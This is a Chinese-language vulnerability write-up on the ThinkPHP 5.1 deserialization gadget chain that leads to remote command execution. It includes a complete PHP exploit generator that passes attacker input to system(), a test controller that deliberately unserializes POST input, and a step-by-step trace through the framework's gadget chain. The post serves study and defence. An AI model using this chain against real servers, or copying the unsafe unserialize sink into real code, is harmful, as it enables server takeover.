ThinkPHP5.1反序列化漏洞实现rce&amp;poc分析
================================

官方文档入口
------

[ThinkPHP5.1完全开发手册 · 看云 (kancloud.cn)](https://www.kancloud.cn/manual/thinkphp5_1)

前言
--

ThinkPHP框架属于应用最广的框架之一，tp5.1框架的漏洞也算很有名且影响范围很大的一个洞，很多师傅也已经写过关于thinkphp5.1X版本反序列化漏洞的分析，本篇旨在记录我的学习心得.

开始之前
----

首先，我们看到这个反序列这个关键字眼首先就会想到那些魔术方法，以及各种属性方法的各种操作触发各种魔术方法，最终执行我们想要的那个方法，把这个思路放在这里也是可以的。

漏洞复现
----

多说几句，我们还是先把存在的魔术方法回顾一下

```php
__construct构造函数每次创建对象都会调用次方法

__destruct析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行

__toString 一个对象被当字符串用的时候就会去执行这个对象的__toString

__call()，因为这个魔术方法中一般执行的是call_user_func()，call_user_func_arry()这两个函数，可以带来命令执行的效果，一般在访问没有定义的变量是触发
```

我们把加载器的index.php改成以下形式

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $c = unserialize($_POST['c']);
        return 'Welcome to ThinkPHP!';
        return $this->fetch('index');
    }

}
```

### 通用exp

```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["l1_Tuer"=>["123"]];
        $this->data = ["l1_Tuer"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        'var_ajax'         => '_ajax',  
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>''];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}

namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}

use think\process\pipes\Windows;
echo (serialize(new Windows()));
?>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-10f17415d4aa7fcf06835b32fcbb03e88aa26c39.png)

### 漏洞分析

我们首先全局搜索以下`__destruct()`方法作为我们漏洞入口，位置再Whindows.php about56line

```php
public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
```

跟进`removeFiles()`

```php
private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
```

而这里使用的`file_exists()`,我们可以读一下这个方法的文档

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-85c7112313980cdf350647339abf741aa8e27048.png)  
这个方法可以把$filename这个变量作为string进行解析，所以这个特性就可以触发`__toString`方法

再全局搜索以下`__toString`方法，跟踪到Conversion.php，about 532 line

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-5b743649ba81ae016c2e10537bfbdae55ba88d94.png)

但是我们会发现，这个`__toString()`所在的Conversion，所以我们不能直接用`file_exists(new Collection())`来触发\_\_toString()，他并不是一个类，而是一个trait，我们要做的就是让上溯源，看哪一个类下`use ../Conversion`从而建立联系

- - - - - -

**寻找关联类**

选择关键（use，extends）

我们直接全局搜索以下`Conversion`

这Model找到Conversion

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-db1ae09d561d91a266d96434775cc456a4896173.png)

不过，Model是个抽象类，我们不能直接对他进行实例化

所以我们要找那个类extends了Model

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-89db3c2f9ac9f5682e9b3c49cac52cccfe09bf23.png)

找到Pivot类

所以我们就可以让`$files`实例化为`Pivot`类，通过`Pivot`关联到`Model`，然后`Model`又包含了`Conversion`，触发`Conversion`中的`__toString`方法。

- - - - - -

讲述完这里，我们继续跟进

```php
    public function __toString()
    {
        return $this->toJson();
    }
```

跟进`toJson()`方法

```php
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }
```

跟进`toArray()`,选取关键部分

```php
//省略...
if (!empty($this->append)) {
            foreach ($this->append as $key => $name) {
                if (is_array($name)) {
                    // 追加关联对象属性
                    $relation = $this->getRelation($key);

                    if (!$relation) {
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);
                            //省略....
```

我们首先需要进入`$relation = $this->getRelation($key)`,如何进入？第一个if，需要Conversion中定义一个append成员属性，这样才能进入，然后对append以提取键值对的形式进行遍历，所以在我们的poc中我们需要给append属性顶一个键值对的形式并且值是一个数值（$name）这样才进入了`$relation = $this->getRelation($key)`，进入以后，我们在往下看我们要的是可以执行这段代码`$relation->visible($name);`因为这样，我们可以把$relation实例成含有`__call`方法的对象，引用类中不存在的方法()

跟进getRelation(visible（）)就可以触发改魔术方法。

```php
/**
     * 获取当前模型的关联模型数据
     * @access public
     * @param  string $name 关联方法名
     * @return mixed
     */
public function getRelation($name = null)
    {//$name为$key
        if (is_null($name)) {
            return $this->relation;
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }

    //这里我们relation为空
```

进入下半部分

```php
if (!$relation) {
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);
```

我们跟进getAttr()方法

```php
public function getAttr($name, &$item = null)
    {
        try {
            $notFound = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $notFound = true;
            $value    = null;
        }

        // 检测属性获取器
        $fieldName = Loader::parseName($name);
        $method    = 'get' . Loader::parseName($name, 1) . 'Attr';

        if (isset($this->withAttr[$fieldName])) {
            if ($notFound && $relation = $this->isRelationAttr($name)) {
                $modelRelation = $this->$relation();
                $value         = $this->getRelationData($modelRelation);
            }

            $closure = $this->withAttr[$fieldName];
            $value   = $closure($value, $this->data);
        } elseif (method_exists($this, $method)) {
            if ($notFound && $relation = $this->isRelationAttr($name)) {
                $modelRelation = $this->$relation();
                $value         = $this->getRelationData($modelRelation);
            }

            $value = $this->$method($value, $this->data);
        } elseif (isset($this->type[$name])) {
            // 类型转换
            $value = $this->readTransform($value, $this->type[$name]);
        } elseif ($this->autoWriteTimestamp && in_array($name, [$this->createTime, $this->updateTime])) {
            if (is_string($this->autoWriteTimestamp) && in_array(strtolower($this->autoWriteTimestamp), [
                'datetime',
                'date',
                'timestamp',
            ])) {
                $value = $this->formatDateTime($this->dateFormat, $value);
            } else {
                $value = $this->formatDateTime($this->dateFormat, $value, true);
            }
        } elseif ($notFound) {
            $value = $this->getRelationAttribute($name, $item);
        }

        return $value;
    }
```

这个方法很长

我们截取关键的部分

```php
public function getAttr($name, &$item = null)
    {
        try {
            $notFound = false;
            $value    = $this->getData($name);

        return $value;
    }
```

不过它内容有多少

总之最后返回的是$value的值，所以我们只需要在意$value是什么就够了，注意上述代码的第五行，我们跟进一下getData($name)

```php
    public function getData($name = null)
    {
        if (is_null($name)) {
            return $this->data;
        } elseif (array_key_exists($name, $this->data)) {
            return $this->data[$name];
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }
```

首先，这里的$name也是上述的$key不为空，$relation本来进入这个方法之前就是空的

所以只能进入第二个if判断

所以给$value就成了data\[$name\]了，所以$relation =$value=data\[$name\]，所以我们就要想办法构造一个data，来return给value，所以我们在poc中构造的时候需要构造一个data，同时是包含传过来对应值的键值对形式

这里插一嘴data\[$name\]是trait Attribute下的属性，而Attribute同样是继承在Model下的

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-bbf607fac569ed5963632cfc04d33731caff449a.png)

所以我们下面的poc编写才会把$data和$append这两个属性写在一块

暂停一下，到此我们梳理一下逻辑关系

```php
append(键值对)->foreach对应key=>name(数组)->relation->getRelation($name对应key)->return relation为空->getAttr($name对应key)->getData($name对应key)->data[$name]
```

- - - - - -

我们要触发的是`__call()`方法，我们将data\[$name\]赋值成一个没有visible方法的对象，就可以触发`__call()`方法，下面进行全局搜索

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-1a443cec338b8495175b69e9d60b82faa66692ed.png)

这样我们可以利用`call_user_func_array($this->hook[$method], $args);`实现命令执行，但是`array_unshift($args, $this);`这个函数可以改变$args

```php
array_unshift()函数用于向数组插入新元素，所以它会把当前这个类给加到args中，
```

这样子就很难做到命令执行，即使我们可以正确的构造`$this->hook[$method]`也无济于事。所以我们要在该类中寻找一个函数可以不需要传参，也就是不需要我们传递给它的`args`

但是我们可以将`hook[$mathod]`定义成其他函数，从而实现了跳板功能

```php
__call()，因为这个魔术方法中一般执行的是call_user_func()，call_user_func_arry()这两个函数，可以带来命令执行的效果
```

我们尝试搜索这两个函数

在同文件的 about 1466line

```php
private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);

        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (false !== strpos($filter, '/')) {
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }

        return $value;
    }
```

这里的$filters和$value是我们最终要控制的变量，只有我们控制了这两个参数才能实现，我们跟踪那个函数调用了filterValue()

跟踪到input()

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-9a96d25f5660adbb218be83c0543908022f64449.png)

不过input方法都是形参，我们还是无法直接控制参数，再看那个方法下调用了input方法

跟踪到param方法

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-13b35d225870de1eb08fae18c17c8c21bb43d7c9.png)

同样也是形参，我们继续跟踪那个方法调用了param方法

跟踪到isAjax(）

```php
   public function isAjax($ajax = false)
    {
        $value  = $this->server('HTTP_X_REQUESTED_WITH');
        $result = 'xmlhttprequest' == strtolower($value) ? true : false;

        if (true === $ajax) {
            return $result;
        }

        $result           = $this->param($this->config['var_ajax']) ? true : $result;
        $this->mergeParam = false;
        return $result;
    }
```

我们的思路就明显了，我们要构造$config参数，

- - - - - -

我们再回到param(）方法，

```php
    public function param($name = '', $default = null, $filter = '')
```

param方法的第一个参数是$name,所以`$name=$this->config['var_ajax']`,我们继续往下看

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-50d0b83c923c9513141b8a834a175eeeb1c337db.png)

而$data = \[\]=$this-&gt;param

在这之中，array\_merge方法作为拼接，$this-&gt;get(false)接受get传进来的值，$vars接受post传进来的值

我们在进入input函数

我们调用的filterValue方法存在于if语句下 about 1387line

```php
        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            if (version_compare(PHP_VERSION, '7.1.0', '<')) {
                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
                $this->arrayReset($data);
```

`array_walk_recursive`方法用法如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-c1df7d04246df295f855278906a9481be8fe4741.png)

所以这里的$data作为后面函数的参数执行

然后再进入filterValue方法，这样$value和$filters就可以被我们控制了，从而实现rce

### poc编写

我们来回顾一下这个漏洞的整体逻辑

```php
class Windows->__destruct()//作为入口触发
class Windows->$this->removeFiles()//为了进入file_exists方法，作为string来进行解析，从而触发__toString
trait Conversion->__toString()
trait Conversion->$this->toJson()
trait Conversion->$this->toArray()//这个方法中存在$relation->visible($name);从而触发__call
class Request->__call()//存在hook[$method]定义成isAjax(),触发该函数，进而触发filterValue方法下的call_user_func()如下
class Request->isAjax()
class Request->$this->param()
class Request->$this->input()
class Request->filterValue()
call_user_func()//实现rce
```

我们首先想办法触发`__toString()`

```php
<?php
namespace think\process\pipes;
use think\model\Pivot;
use think\model\concern\Conversion;
class Windows extends Pipes
    //从__destruct()为入口进入到romoveFile()的file_exists方法，files会as为filename从而
    //file_exists(new Pivot())触发toString
{
    private files=[];
    public function __construct{
        $this->files=[new Pivot()];
    }
}
```

为了将 `windows` 和 `Convertion` 进行连接，我们可以利用命名空间中的 `Conversion`。在 `Model` 中使用了 `Conversion` 的命名空间，而 `Pivot` 继承了 `Model`，所以我们可以通过创建一个 `Pivot` 实例来与 `Conversion` 进行联系。

```php
namespace think\model;
use think\Model;
class Pivot extends Model
{
}
namespace think;
use InvalidArgumentException;
use think\db\Query;
abstract class Model
{
    protected $append=[];
    private $data=[];
    //这里是toArray()里面的以$key为中心的操作,回顾源码$name对于的就是$key,上面以及提到
    function __construct{
        $this->append=["l1_Tuer"=>["1"]];
         $this->data=["l1_Tuer"=>new Request()];
    }
}
```

在进入 `Request()` 并触发 `__call` 方法时，我们需要通过使用 `hook` 这个桥梁来连接其他函数。`call` 传递了两个参数，分别是 `visible` 和 `$name`。在这个位置，我们需要将 `hook[$method]` 和我们之前分析的 `isAjax()` 进行关联。需要注意的是，在这里的 `config`，我们只是因为调用实参而使用它，并不需要传递任何值，将其设置为空即可。否则，后面代码中的 `$data` 将无法成功传递到我们的危险函数中。

```php
namespace think
use think\facade\Cookie;
use think\facade\Session;
class Request{
    protected $hook = [];
    protected $filter = "system";
    protected $config = ['var_ajax'=>'',];
    function __construct(){
        $this->hook = ['visible'=>[$this,"isAjax"]];
        $this->filter = "system";
        $this->config = ['var_ajax'=>'',];
    }
```

`$this->$config = ['var_ajax'=>'',];`如果设置为空，那我们get传入的变量名可以为任意值，但是定义了之后，get传入的变量名就只能是我们定义的变量名。

我们var\_dump一下

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-1cc26f020aeb77adcb7d2909b7fcb7c45f17ea55.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-c2b02a852b0a58be578dbbae7d38dafe45af2489.png)